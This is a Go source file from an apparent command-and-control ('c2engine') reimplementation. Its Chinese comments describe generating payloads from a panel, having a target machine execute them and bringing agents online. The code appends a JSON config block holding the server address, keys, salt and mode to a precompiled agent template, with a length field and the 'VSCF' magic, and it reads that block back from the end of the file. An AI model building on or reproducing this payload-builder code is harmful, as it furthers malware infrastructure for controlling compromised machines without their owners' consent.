package c2engine

// Agent 配置块（复刻端扩展）。
//
// 原版的载荷生成 = "预编译模板 + 追加配置/argv"，但**配置块的字段语义与 argv
// 加密 key 尚未恢复**（RE-NOTES U-01/U-02），因此原版 agent 无法被我们的服务端
// 正确配置。为了把"面板生成载荷 → 目标机执行 → 上线"这条链路先跑通，复刻端
// 在模板尾部追加一个**自描述配置块**，供自研 agent（agent/config_block.go）解析：
//
//	trailer = <blob> <blobLen u32 LE> "VSCF"
//	blob    = JSON {"server":"...","vkey":"...","salt":"...","mode":"...", ...}
//
// 约定：
//   - 尾部 8 字节固定为 `len(u32) + "VSCF"`，便于从文件末尾 O(1) 定位；
//   - 与 PE/ELF 结构无关（追加在文件尾，加载器不会执行到它）；
//   - 与原版配置块（PoConfigBlock）并存：前者给自研 agent 用，后者保留作对齐证据。
//
// ⚠ 这是**有意偏差**，登记在 docs/STATUS.md 的偏差清单里；等 U-01/U-02 恢复后
// 应改为写原版格式，并让 agent 解析原版格式。

import (
	"encoding/binary"
	"encoding/json"
	"errors"
	"os"
)

const (
	// AgentConfigMagic 是配置块的尾部魔数。
	AgentConfigMagic = "VSCF"
	// agentConfigMaxBlob 是配置块长度上限（防御性校验）。
	agentConfigMaxBlob = 64 * 1024
)

// ErrNoAgentConfig 表示文件里没有配置块。
var ErrNoAgentConfig = errors.New("c2engine: no agent config block")

// EncodeAgentConfigBlock 把配置序列化成尾部块（含 len + magic）。
func EncodeAgentConfigBlock(cfg map[string]string) ([]byte, error) {
	blob, err := json.Marshal(cfg)
	if err != nil {
		return nil, err
	}
	out := make([]byte, 0, len(blob)+8)
	out = append(out, blob...)
	var hdr [8]byte
	binary.LittleEndian.PutUint32(hdr[0:4], uint32(len(blob)))
	copy(hdr[4:8], AgentConfigMagic)
	return append(out, hdr[:]...), nil
}

// AppendAgentConfigBlock 在模板尾部追加配置块。
func AppendAgentConfigBlock(template []byte, cfg map[string]string) ([]byte, error) {
	block, err := EncodeAgentConfigBlock(cfg)
	if err != nil {
		return nil, err
	}
	out := make([]byte, 0, len(template)+len(block))
	out = append(out, template...)
	return append(out, block...), nil
}

// ReadAgentConfigBlockFile 从文件尾部读回配置块（agent 用作自解析入口）。
func ReadAgentConfigBlockFile(path string) (map[string]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	st, err := f.Stat()
	if err != nil {
		return nil, err
	}
	size := st.Size()
	if size < 8 {
		return nil, ErrNoAgentConfig
	}
	hdr := make([]byte, 8)
	if _, err := f.ReadAt(hdr, size-8); err != nil {
		return nil, err
	}
	if string(hdr[4:8]) != AgentConfigMagic {
		return nil, ErrNoAgentConfig
	}
	n := int(binary.LittleEndian.Uint32(hdr[0:4]))
	if n <= 0 || n > agentConfigMaxBlob || int64(n)+8 > size {
		return nil, ErrNoAgentConfig
	}
	blob := make([]byte, n)
	if _, err := f.ReadAt(blob, size-8-int64(n)); err != nil {
		return nil, err
	}
	var cfg map[string]string
	if err := json.Unmarshal(blob, &cfg); err != nil {
		return nil, err
	}
	return cfg, nil
}
